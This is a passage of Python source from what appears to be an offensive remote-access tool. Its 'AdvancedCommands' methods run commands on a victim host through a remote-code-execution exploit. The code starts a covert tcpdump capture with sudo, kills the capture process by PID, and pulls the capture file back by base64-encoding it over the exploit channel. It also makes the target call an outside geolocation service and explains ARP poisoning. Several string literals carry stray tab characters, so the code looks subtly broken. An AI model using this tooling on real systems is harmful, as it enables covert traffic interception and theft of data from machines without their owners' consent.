        console.print(f"[bold yellow][Advanced] Simulating ARP Poisoning concept:[/bold yellow]")
        console.print(f" - Target: {target_ip}")
        console.print(f" - Gateway: {gateway_ip}")
        console.print(" - Action: Send crafted ARP replies to associate gateway IP with attacker MAC, and target IP with attacker MAC.")
        console.print(" - Note: Requires raw socket access and tools like arpspoof/ettercap, not directly feasible via simple RCE.")
        return {"status": "simulated", "info": "ARP poisoning concept explained"}

    @staticmethod
    def start_network_sniff(ip, port, interface, filter="", output_file="/tmp/sniffed.pcap"):
        """Start network sniffing using tcpdump (requires root)."""
        try:
            # Ensure output_file path is writable
            command = f"sudo tcpdump -i {interface} -w {output_file} {filter} -U -W 1 -G 3600 & echo $!"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"].strip().isdigit():
                pid = result["response"].strip()
                console.print(f"[bold green][Advanced] Network sniffing started on {interface} (PID: {pid}), saving to {output_file}[/bold green]")
                return {"status": "success", "pid": pid, "file": output_file}
            else:
                console.print(f"[bold red][Advanced] Failed to start network sniffing: {result.get(	'error	', 	'No response or tcpdump failed	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or tcpdump failed")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Start sniffing error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def stop_network_sniff(ip, port, pid):
        """Stop a running network sniffing process by PID."""
        return AdvancedCommands.kill_process_by_pid(ip, port, pid)

    @staticmethod
    def download_sniffed_traffic(ip, port, remote_file_path):
        """Download the captured network traffic file."""
        # This requires a file download mechanism, reusing existing file manager logic if possible
        # Or implement a simple base64 encode -> RCE -> decode locally
        try:
            command = f"base64 {remote_file_path}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                file_data = base64.b64decode(result["response"])
                os.makedirs("Download", exist_ok=True)
                local_filename = f"Download/{os.path.basename(remote_file_path)}_{time.strftime('%Y%m%d_%H%M%S')}.pcap"
                with open(local_filename, "wb") as f:
                    f.write(file_data)
                console.print(f"[bold green][Advanced] Sniffed traffic file downloaded to {local_filename}[/bold green]")
                return {"status": "success", "filename": local_filename}
            else:
                console.print(f"[bold red][Advanced] Failed to download sniffed traffic: {result.get(	'error	', 	'No response or base64 failed	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or base64 failed")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Download sniffed traffic error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def check_rootkit(ip, port):
        """Run rootkit checkers like chkrootkit or rkhunter if available (simulation)."""
        try:
            command = "chkrootkit || rkhunter --check --skip-keypress || echo \"Rootkit check simulated\""
            result = RCEExploit.execute_rce(ip, port, command)
            console.print(f"[bold blue][Advanced] Rootkit check simulation result: {result.get(	'response	', 	'No response	')}[/bold blue]")
            return {"status": "simulated", "info": result.get("response", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Rootkit check error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_geolocation(ip, port):
        """Attempt to get geolocation based on public IP (runs command on target)."""
        try:
            # Uses an external service via curl
            command = "curl ipinfo.io || curl ifconfig.me/all.json || echo \"Geolocation lookup simulated\""
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Geolocation Info (from target)"))
                return {"status": "success", "geolocation": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get geolocation: {result.get(	'error	', 	'No response or curl failed	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or curl failed")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Geolocation error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}


